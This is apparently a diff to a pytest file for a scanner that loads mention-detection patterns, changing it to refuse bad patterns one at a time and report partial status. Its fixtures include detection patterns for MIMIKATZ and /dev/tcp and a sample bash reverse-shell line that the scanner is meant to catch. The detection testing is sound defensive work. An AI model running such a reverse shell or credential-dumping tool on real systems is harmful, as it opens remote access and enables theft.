@@ -119,35 +119,83 @@ REFUSALS = [
 
 
 @pytest.mark.parametrize(("changes", "reason"), REFUSALS)
-def test_a_bad_pattern_refuses_its_whole_file_with_a_clear_error(tmp_path, changes, reason):
+def test_a_bad_pattern_is_refused_alone_with_a_clear_error(tmp_path, changes, reason):
     good = _pattern(id="mention.t_good")
     bad = _pattern(**changes)
     if "match" in changes and "examples" not in changes and "anchored" in changes["match"]:
         bad["examples"] = {"positive": ["abcde"], "negative": ["zzzz"]}
     _file(tmp_path, "a.yaml", [good, bad])
     _file(tmp_path, "b.yaml", [_pattern(id="mention.t_other")])
-    with pytest.raises(MentionPatternError) as error:
-        load_pattern_file(tmp_path / "a.yaml")
-    assert "a.yaml" in str(error.value) and reason in str(error.value), str(error.value)
+    patterns, compiled, refused = load_pattern_file(tmp_path / "a.yaml")
+    assert [p.id for p in patterns] == ["mention.t_good"] and len(compiled) == 1
+    assert len(refused) == 1 and refused[0]["name"] == "a.yaml"
+    assert "a.yaml" in refused[0]["error"] and reason in refused[0]["error"], refused[0]["error"]
     loaded = load_mention_patterns(tmp_path)
-    # the good pattern of the refused file does not run; the other file still loads
-    assert [p.id for p in loaded.patterns] == ["mention.t_other"]
-    assert loaded.refused and loaded.refused[0]["name"] == "a.yaml"
+    # the good pattern of the same file still runs, and so does the other file
+    assert [p.id for p in loaded.patterns] == ["mention.t_good", "mention.t_other"]
+    assert [c.index for c in loaded.compiled] == [0, 1]
+    assert [(item["name"], item["pattern"]) for item in loaded.refused] == [("a.yaml", refused[0]["pattern"])]
 
 
-def test_a_duplicate_id_in_a_later_file_refuses_that_file(tmp_path):
+def test_a_duplicate_id_in_a_later_file_refuses_that_pattern(tmp_path):
     _file(tmp_path, "a.yaml", [_pattern()])
     _file(tmp_path, "b.yaml", [_pattern(), _pattern(id="mention.t_two")])
     loaded = load_mention_patterns(tmp_path)
-    assert [p.id for p in loaded.patterns] == ["mention.t_one"]
-    assert loaded.refused[0]["name"] == "b.yaml" and "defined twice" in loaded.refused[0]["error"]
+    assert [p.id for p in loaded.patterns] == ["mention.t_one", "mention.t_two"]
+    assert [(item["name"], item["pattern"]) for item in loaded.refused] == [("b.yaml", "mention.t_one")]
+    assert "defined twice" in loaded.refused[0]["error"]
+
+
+def test_an_id_a_refused_pattern_defines_stays_taken(tmp_path):
+    _file(tmp_path, "a.yaml", [_pattern(strength="urgent"), _pattern(id="mention.t_two")])
+    _file(tmp_path, "b.yaml", [_pattern()])
+    loaded = load_mention_patterns(tmp_path)
+    assert [p.id for p in loaded.patterns] == ["mention.t_two"]
+    assert [(item["name"], item["pattern"]) for item in loaded.refused] == [("a.yaml", "mention.t_one"),
+                                                                            ("b.yaml", "mention.t_one")]
 
 
 @pytest.mark.parametrize("text", ["{not yaml", "- just a string", "{}", ""])
-def test_a_file_that_is_not_a_pattern_list_is_refused(tmp_path, text):
+def test_a_file_that_is_not_a_pattern_list_is_refused_whole(tmp_path, text):
     (tmp_path / "x.yaml").write_text(text, encoding="utf-8")
+    with pytest.raises(MentionPatternError):
+        load_pattern_file(tmp_path / "x.yaml")
+    _file(tmp_path, "y.yaml", [_pattern()])
     loaded = load_mention_patterns(tmp_path)
-    assert loaded.patterns == [] and loaded.refused[0]["name"] == "x.yaml"
+    assert [p.id for p in loaded.patterns] == ["mention.t_one"]
+    assert [(item["name"], item["pattern"]) for item in loaded.refused] == [("x.yaml", None)]
+    scanner = MentionScanner("h1", loaded)
+    summary = scanner.summary()
+    assert summary["status"] == "partial"
+    assert any(reason.startswith("pattern file x.yaml was refused") for reason in summary["reasons"])
+
+
+def test_one_refused_pattern_among_good_ones_leaves_them_running_and_the_pool_partial(tmp_path):
+    good = [_pattern(id="mention.t_mimi", match={"literal": ["MIMIKATZ"]}, case_sensitive=False,
+                     examples={"positive": ["run mimikatz"], "negative": ["mimi katz"]}),
+            _pattern(id="mention.t_tcp", match={"anchored": "/dev/tcp/[0-9]{1,3}"},
+                     examples={"positive": ["x >& /dev/tcp/10.0.0.1/1"], "negative": ["/dev/tcpx"]})]
+    bad = _pattern(id="mention.t_gaps", match={"anchored": "abcd.{0,80}=.{0,80}=.{0,80}=.{0,80}X"},
+                   examples={"positive": ["abcd = = = X"], "negative": ["zzzz"]})
+    _file(tmp_path / "p", "mixed.yaml", [good[0], bad, good[1]])
+    loaded = load_mention_patterns(tmp_path / "p")
+    assert [p.id for p in loaded.patterns] == ["mention.t_mimi", "mention.t_tcp"]
+    assert loaded.files == [{"name": "mixed.yaml", "digest": loaded.files[0]["digest"], "patterns": 2, "refused": 1}]
+    from romulus.content.mention_patterns import pattern_pin
+    pin = pattern_pin(loaded)
+    assert [(item["name"], item["pattern"]) for item in pin["refused"]] == [("mixed.yaml", "mention.t_gaps")]
+    assert "open gaps" in pin["refused"][0]["error"] and pin["refused_total"] == 1
+    scanner = MentionScanner("h1", loaded, stage_dir=tmp_path)
+    scanner.scan(TARGET, CONTRACT, [(_hit(1, "Running MIMIKATZ"), "x"),
+                                    (_hit(2, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), "x")], None)
+    summary = scanner.summary()
+    assert summary["lines_matched"] == 2
+    assert {loaded.patterns[row[1]].id for row in scanner.ranked()} == {"mention.t_mimi", "mention.t_tcp"}
+    assert summary["status"] == "partial"
+    assert any(reason.startswith("pattern mention.t_gaps refused") and "open gaps" in reason
+               for reason in summary["reasons"])
+    assert summary["patterns"]["refused_total"] == 1
+    scanner.close()
 
 
 def test_no_pattern_directory_reads_as_not_scanned_never_as_no_mentions(tmp_path):
